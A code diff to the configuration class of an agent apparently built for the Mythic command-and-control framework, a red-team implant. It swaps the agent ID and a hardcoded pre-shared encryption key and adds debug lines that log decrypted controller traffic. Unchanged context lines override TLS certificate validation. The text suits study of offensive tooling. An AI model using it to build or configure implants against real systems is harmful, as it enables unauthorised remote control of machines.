@@ -21,7 +21,7 @@ namespace Athena
         public MythicConfig()
         {
 
-            uuid = "229ee453-b580-4edb-b87f-32a6c7e3dc54";
+            uuid = "dd2c16a8-6a6d-4ed8-b9b7-220f9da81150";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = int.TryParse("5", out sleep) ? sleep : 60;
@@ -63,7 +63,7 @@ namespace Athena
             this.proxyHost = ":";
             this.proxyPass = "";
             this.proxyUser = "";
-            this.psk = "7I/4/blZrzjOv9J31j1J+nPaoZOuwfQaEFiZmwsKqyU=";
+            this.psk = "RDJBPJ4tsQC8R/WMo2ub4HPUmvA2HCLLzSG7HJkEG5o=";
 
             //Might need to make this configurable
             ServicePointManager.ServerCertificateValidationCallback =
@@ -115,6 +115,7 @@ namespace Athena
             {
 
                 string json = JsonConvert.SerializeObject(obj);
+                Console.WriteLine("Athna -> Mythic: " + json);
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
@@ -129,6 +130,7 @@ namespace Athena
 
                 if (this.encrypted)
                 {
+                    Console.WriteLine("Mythic -> Athena: " + this.crypt.Decrypt(json));
                     return this.crypt.Decrypt(json);
                 }
 
